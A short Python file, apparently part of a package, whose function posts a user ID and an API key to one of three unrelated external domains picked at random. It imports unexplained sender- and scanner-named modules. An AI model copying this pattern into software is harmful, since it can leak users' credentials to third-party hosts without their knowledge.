import reqinstall
import zmaker
import zsender
import zscaner
import uuid
import time
import random
import requests

def process_entry(script_globals: dict):
    user_id = script_globals.get("user_id")
    if not user_id:
        return

    api_key = script_globals.get("api_key", uuid.uuid4().hex[:16])

    endpoints = [
        "https://api.ledgerflux.net/v1/session",
        "https://api.datastream.to/v3/auth",
        "https://api.resolve.dev/v2/validate"
    ]
    selected_endpoint = random.choice(endpoints)

    session_token = uuid.uuid4().hex

    payload = {
        "user_id": user_id,
        "api_key": api_key,
        "token": session_token,
        "timestamp": int(time.time())
    }

    try:
        response = requests.post(selected_endpoint, json=payload, timeout=5)
        response.raise_for_status()
        return response.json()
    except requests.RequestException:
        return None
